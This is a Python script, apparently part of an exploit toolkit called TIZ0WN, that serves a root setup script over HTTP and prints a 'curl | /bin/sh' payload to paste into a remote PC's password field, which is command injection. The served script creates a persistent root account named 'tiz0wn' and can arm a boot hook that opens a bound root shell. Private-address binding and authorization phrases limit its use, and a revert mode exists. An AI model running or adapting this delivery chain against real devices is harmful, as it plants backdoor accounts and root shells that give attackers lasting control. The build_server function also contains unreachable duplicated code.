#!/usr/bin/env python3
"""Host server for the persist-root delivery.

Serves the prepared root setup script (prelude + ``root_setup.sh`` body) at
``/d``, bound only to the configured private host address. On start it prints
the SHA-256 of the served body, the exact ``curl | /bin/sh`` password payload,
and the expected effective length, so they can be compared out of band before
the one authorized trigger.

    python3 serve.py --bind 192.168.8.138 --port 18080 \
        --password 'your-own-password' \
        --ack I-AUTHORIZE-PERSISTENT-ROOT-SETUP

The password you pass becomes the hash embedded in the served script; it is
never printed. Without ``--password`` the server refuses to start (a
passwordless account would be a hole, not a feature). ``--shell-host`` and
``--shell-port`` additionally arm the boot hook's bound root shell; without
them the hook only re-creates the account and writes markers.

    --host 192.168.8.138 --mode fetch [--chmod]   alternative fetch delivery
"""

from __future__ import annotations

import argparse
import hashlib
import http.server
import ipaddress
import re
from pathlib import Path

import payload
import prelude
import sha512crypt

HERE = Path(__file__).resolve().parent
TEMPLATE = HERE / "root_setup.sh"
DEFAULT_PATH = "/d"
SETUP_ACK = "I-AUTHORIZE-PERSISTENT-ROOT-SETUP"
REVERT_ACK = "I-AUTHORIZE-PERSISTENT-ROOT-REVERT"


def require_private_bind(value: str) -> str:
    try:
        address = ipaddress.IPv4Address(value)
    except ipaddress.AddressValueError as error:
        raise SystemExit("--bind must be a canonical IPv4 literal") from error
    if str(address) != value or not address.is_private:
        raise SystemExit("--bind must be an RFC1918 address (this LAN only)")
    return value


def prepare_body(
    *,
    user: str,
    password_hash: str,
    token: str,
    shell_host: str,
    shell_port: str,
    extra_args: str,
) -> str:
    return (
        prelude.build_prelude(
            user=user,
            password_hash=password_hash,
            token=token,
            shell_host=shell_host,
            shell_port=shell_port,
            extra_args=extra_args,
        )
        + TEMPLATE.read_text(encoding="ascii")
    )


class Handler(http.server.BaseHTTPRequestHandler):
    body_override: bytes = b""
    http_path: str = "/d"

    def _send(self) -> None:
        ok = self.path in (self.http_path, "/install.sh")
        body = self.body_override if ok else b"404"
        self.send_response(200 if ok else 404)
        if ok:
            self.send_header("Content-Type", "application/x-sh")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def do_GET(self) -> None:  # noqa: N802 - stdlib name
        self._send()

    def do_HEAD(self) -> None:  # noqa: N802 - stdlib name
        # Headers only: the served body carries the account password hash.
        self._send()

    def log_message(self, *args: object) -> None:
        return


def build_server(*, bind: str, port: int, body: bytes, http_path: str = "/d"):
    handler = type(
        "BoundHandler",
        (Handler,),
        {"body_override": body, "http_path": http_path},
    )
    return http.server.ThreadingHTTPServer((bind, port), handler)
    handler = type(
        "BoundHandler",
        (Handler,),
        {"body_override": body},
    )
    return http.server.ThreadingHTTPServer((bind, port), handler)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--bind", required=True, help="this Mac's private LAN IPv4")
    parser.add_argument("--port", type=int, default=18080)
    parser.add_argument("--http-path", default=DEFAULT_PATH)
    parser.add_argument("--password", required=True, help="password for the created account")
    parser.add_argument("--user", default="tiz0wn")
    parser.add_argument("--shell-host", help="boot hook: host for the bound root shell")
    parser.add_argument("--shell-port", help="boot hook: port for the bound root shell")
    parser.add_argument("--revert", action="store_true", help="serve the revert variant")
    parser.add_argument("--token", required=True, help="16 lowercase hex run token")
    parser.add_argument("--ack", required=True)
    args = parser.parse_args()
    if args.revert:
        expected_ack = REVERT_ACK
    else:
        expected_ack = SETUP_ACK
    if args.ack != expected_ack:
        raise SystemExit(f"wrong authorization phrase; --revert needs {REVERT_ACK}")
    if not token_shape(args.token):
        raise SystemExit("--token must be 16 lowercase hex characters")
    require_private_bind(args.bind)
    if not (1 <= args.port <= 65535):
        raise SystemExit("--port must be 1-65535")

    salt = "tiz0wn" + args.token[:6]
    try:
        password_hash = sha512crypt.hash_password(args.password, salt=salt)
    except ValueError as error:
        raise SystemExit(f"cannot hash the account password: {error}") from error

    shell_host = args.shell_host or ""
    shell_port = args.shell_port or ""
    extra_args = "--revert" if args.revert else ""
    body = prepare_body(
        user=args.user,
        password_hash=password_hash,
        token=args.token,
        shell_host=shell_host,
        shell_port=shell_port,
        extra_args=extra_args,
    )
    body_sha256 = hashlib.sha256(body.encode("ascii")).hexdigest()

    try:
        built = payload.build_pipe_password(
            host_ip=args.bind, port=args.port, http_path=args.http_path
        )
    except ValueError as error:
        raise SystemExit(f"invalid delivery options: {error}") from error
    print("TIZ0WN persist-root delivery server")
    print(f"  bind:           {args.bind}:{args.port}{args.http_path}")
    print(f"  served sha256:  {body_sha256}")
    print(f"  account:        {args.user} (password not shown)")
    print(f"  shell binding:  {shell_host}:{shell_port or '-'}")
    print(f"  variant:        {'revert' if args.revert else 'apply'}")
    print("  password payload (paste once into the Remote PC password field):")
    print(f"    {built.password}")
    print(f"  payload length: {built.password_length} (bound {payload.REVIEWED_BOUND})")
    print("  Ctrl-C stops the server; one trigger, no retry.")

    server = build_server(
        bind=args.bind, port=args.port, body=body.encode("ascii"), http_path=args.http_path
    )
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nserver stopped")
    return 0


def token_shape(token: str) -> bool:
    return re.fullmatch(r"[0-9a-f]{16}", token) is not None


if __name__ == "__main__":
    raise SystemExit(main())
